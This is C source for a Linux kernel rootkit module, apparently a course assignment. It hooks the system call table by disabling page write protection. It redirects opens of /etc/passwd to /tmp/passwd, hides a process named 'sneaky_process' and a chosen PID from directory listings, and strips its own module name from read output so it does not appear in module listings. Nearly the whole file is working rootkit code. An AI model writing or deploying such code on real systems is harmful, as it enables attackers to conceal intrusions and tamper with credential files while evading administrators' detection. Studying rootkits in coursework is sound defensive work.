#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>


#define PREFIX "sneaky_process"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Rachel");
static char * pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "A process id");

//This is a pointer to the system call table
static unsigned long *sys_call_table;


struct linux_dirent64 {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  unsigned char 	d_type;
  char d_name[0];
};


// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  //get first parameter of openat here: dirfd
  printk(KERN_INFO "sneaky_sys_openat module being loaded.\n");

  //get second parameter of openat here: pathname
  const char * pathname = (char *) regs->si;
  const char * object = "/etc/passwd";
  const char * temp = "/tmp/passwd";
  unsigned long user_buf_addr = regs->si;
  //need to check if the file name is : /etc/passwd
  //then check if pathname equals /etc/passwd
  if(strcmp(pathname,object) == 0 ){
    printk(KERN_INFO "strcmp here.\n");
    copy_to_user((void*)user_buf_addr, temp, strlen(temp));
  }
  return (*original_openat)(regs);
}

asmlinkage int (*original_getdents)(struct pt_regs *);

// Define your new sneaky version of the 'getdents' syscall
  asmlinkage int sneaky_sys_getdents(struct pt_regs *regs){
  // printk(KERN_INFO "sneaky_sys_getdents: called\n");
  int ret = (*original_getdents)(regs);
  // printk(KERN_INFO "ret %d\n",ret);
  //check if return value of original_getdents is less and equal to 0: which means read directory failed
  //do not need to update anything
  // if(ret<=0){
  //   printk(KERN_INFO "return value <= 0\n");
  //   return ret;
  // }
  //if not:
  //we need to iterate the buffer that that the second parameter points to
  struct linux_dirent64 * dirp = (struct linux_dirent64 *) regs->si;
  //use char * to let p increment as we indicate 
  char * p;
  //eg p+1 not p+sizeof(linux_dirent64)
  
  for(p = (char *) dirp; p < (char *)dirp+ret;){
    // printk(KERN_INFO "here but not find\n");
    //get linux_dirent64 * pointer
    struct linux_dirent64 * temp = (struct linux_dirent64 *) p;
    // printk(KERN_INFO "The string is %s\n", temp->d_name);
    // check if sneaky_process in this buffer 
    // replace the buffer with the content after the struct that d_name = sneaky_process

    if(strcmp(temp->d_name,"sneaky_process")==0 ||
        (strcmp(temp->d_name, pid) == 0)){
      // dirp+res-(p+temp->d_reclen)
      // printk(KERN_INFO "sneaky_process/pid: finded\n");
      memmove(p, p+temp->d_reclen, ((char *)dirp + ret - (char *)(p + temp->d_reclen)));
      ret -= temp->d_reclen;

    }
    else{
      p = p + temp->d_reclen;
    }
  }
  return ret;
}

asmlinkage ssize_t (*original_read)(struct pt_regs *);

// Define your new sneaky version of the 'getdents' syscall
asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
  printk(KERN_INFO "sneaky_sys_read being loaded.\n");
  
  ssize_t ret = (*original_read)(regs);
  //get the address of return buffer which is second parameter
  char * buffer = (char *)regs->si;
  //check if buffer contain   
  char * start = strstr(buffer, "sneaky_mod");

  if(start != NULL){
    printk(KERN_INFO "sneaky_mod find.\n");
    char * endofline = strchr(start, '\n');
    if(endofline != NULL){
      //replace the middle
      memmove(start,endofline+1, (char __user*)(buffer+ret)-(endofline+1));
      ret -= (ssize_t) (endofline+1-start);
    }

  }
  return ret;


}



// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  printk(KERN_INFO "pid %s\n",pid);

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;


  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents;
   sys_call_table[__NR_read] = (unsigned long)original_read;



  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");